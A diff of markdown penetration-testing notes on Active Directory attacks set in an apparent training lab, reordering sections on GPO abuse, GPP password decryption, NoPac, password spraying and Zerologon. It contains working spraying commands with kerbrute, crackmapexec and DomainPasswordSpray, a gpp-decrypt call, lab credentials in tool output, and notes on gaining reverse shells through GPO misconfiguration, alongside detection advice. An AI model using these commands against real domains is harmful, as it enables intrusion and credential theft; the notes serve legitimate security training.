@@ -31,51 +31,112 @@ tags:
 	- [Linux in active directory](linux-in-active-directory.md)
 
 
+## ⛓️ DCShadow
 
-## Password attacks
+[See https://blog.netwrix.com/2022/09/28/dcshadow_attack/](https://blog.netwrix.com/2022/09/28/dcshadow_attack/)
 
-## 🍥 Password spraying
 
-### DomainPasswordSpray
+## 🤐 Group Policy Object Abuse
 
-[See DomainPasswordSpray](domainpasswordspray.md)
+We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.
 
-```powershell-session
-Import-Module .\DomainPasswordSpray.ps1
+### Powershell
 
-# Authenticated in the domain:
-Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
-# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
-
-# Not authenticated in the domain:
-Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
-```
-
-### kerbrute
-
-```
-./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
-```
-
-### crackmapexec
+If Group Policy Management Tools are installed on the host we are working from, we can use various built-in [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) such as `Get-GPO` to perform the same enumeration.
 
 ```powershell
-# Spraying password with crackmapexec
-crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
-# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
-# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
-# -H: hash
+Get-GPO -All | Select DisplayName
 ```
 
 
-### Mitigation techniques against password spraying
+### Powerview
+Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) function from PowerView, we can get a listing of GPOs by name.
 
-- Multi-factor Authentication	
-- Restricting Access
-- Reducing Impact of Successful Exploitation
-- Password Hygiene
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainGPO |select displayname
+```
 
-In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.
+Enumerating GPO Names with PowerView
+
+```powershell
+$sid=Convert-NameToSid "Domain Users"
+Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+```
+
+Results:
+
+``` 
+ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID             :
+ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner
+
+... SNIP ...
+
+```
+
+Converting GPO GUID to Name:
+
+```powershell
+Get-GPO -Guid $GUID
+# Example:
+# Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+# In this case we  can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO. 
+```
+
+Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO. If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.
+
+We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.
+
+**When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to**.
+
+
+
+
+## 👥 Group Policy Preferences (GPP) Passwords
+
+When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
+
+- Map drives (drives.xml)
+- Create local users
+- Create printer config files (printers.xml)
+- Creating and updating services (services.xml)
+- Creating scheduled tasks (scheduledtasks.xml)
+- Changing local admin passwords.
+
+These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
+
+This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
+
+In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the “cpassword” parameter that can get decrypted with Microsoft’s public AES key (link). If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:
+
+```bash
+gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+```
+
+Locating & Retrieving GPP Passwords with CrackMapExec
+
+```shell-session
+crackmapexec smb -L | grep gpp
+```
+
+To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules — `**gpp_password**` and `**gpp_autologin**` modules. The `**gpp_password**` decrypts passwords stored in the Group.xml file, while `**gpp_autologin**` retrieves autologin information from the Registry.xml file in the preferences folder.
+
+
+```bash
+crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin
+# Example:
+# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+```
+
+Results:
+```
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
+```
+
+
 
 ## 💌 LLMNR/NBT-NS Poisoning
 
@@ -202,14 +263,59 @@ GET NTLMV2USERNAMES
 ```
 
 
-## ❌ Zerologon
+## 🪤 NoPac (SamAccountName Spoofing)
 
-[See https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/.](https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/)
+!!! tips "Detailed explanations"
+	- [noPac: A Tale of Two Vulnerabilities That Could End in Ransomware](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).
+	- [SAM Name impersonation](https://techcommunity.microsoft.com/users/daniel%20naim/164126).
+
+This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.
+
+[See more on NoPac (Sam account Spoofing)](nopac-sam-account-spoofing.md).
 
 
-## ⛓️ DCShadow
+## 🍥 Password spraying
 
-[See https://blog.netwrix.com/2022/09/28/dcshadow_attack/](https://blog.netwrix.com/2022/09/28/dcshadow_attack/)
+### DomainPasswordSpray
+
+[See DomainPasswordSpray](domainpasswordspray.md)
+
+```powershell-session
+Import-Module .\DomainPasswordSpray.ps1
+
+# Authenticated in the domain:
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
+
+# Not authenticated in the domain:
+Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+### kerbrute
+
+```
+./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
+```
+
+### crackmapexec
+
+```powershell
+# Spraying password with crackmapexec
+crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
+# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
+# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
+# -H: hash
+```
+
+
+### Mitigation techniques against password spraying
+
+- Multi-factor Authentication	
+- Restricting Access
+- Reducing Impact of Successful Exploitation
+- Password Hygiene
+
+In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.
 
 
 ## 🍟 PetitPotam (MS-EFSRPC)
@@ -363,101 +469,6 @@ First off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-gui
 Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext.
 
 
-## 👥 Group Policy Preferences (GPP) Passwords
+## ❌ Zerologon
 
-When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
-
-- Map drives (drives.xml)
-- Create local users
-- Create printer config files (printers.xml)
-- Creating and updating services (services.xml)
-- Creating scheduled tasks (scheduledtasks.xml)
-- Changing local admin passwords.
-
-These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
-
-This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
-
-In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the “cpassword” parameter that can get decrypted with Microsoft’s public AES key (link). If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:
-
-```bash
-gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
-```
-
-Locating & Retrieving GPP Passwords with CrackMapExec
-
-```shell-session
-crackmapexec smb -L | grep gpp
-```
-
-To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules — `**gpp_password**` and `**gpp_autologin**` modules. The `**gpp_password**` decrypts passwords stored in the Group.xml file, while `**gpp_autologin**` retrieves autologin information from the Registry.xml file in the preferences folder.
-
-
-```bash
-crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin
-# Example:
-# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
-```
-
-Results:
-```
-GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
-GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
-GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
-```
-
-
-
-## Group Policy Object Abuse
-
-We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.
-
-### Powershell
-
-If Group Policy Management Tools are installed on the host we are working from, we can use various built-in [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) such as `Get-GPO` to perform the same enumeration.
-
-```powershell
-Get-GPO -All | Select DisplayName
-```
-
-
-### Powerview
-Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) function from PowerView, we can get a listing of GPOs by name.
-
-```powershell
-Import-Module .\PowerView.ps1
-Get-DomainGPO |select displayname
-```
-
-Enumerating GPO Names with PowerView
-
-```powershell
-$sid=Convert-NameToSid "Domain Users"
-Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
-```
-
-Results:
-
-``` 
-ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
-ObjectSID             :
-ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner
-
-... SNIP ...
-
-```
-
-Converting GPO GUID to Name:
-
-```powershell
-Get-GPO -Guid $GUID
-# Example:
-# Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
-# In this case we  can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO. 
-```
-
-Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO. If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.
-
-We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.
-
-**When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to**
+[See https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/.](https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/)
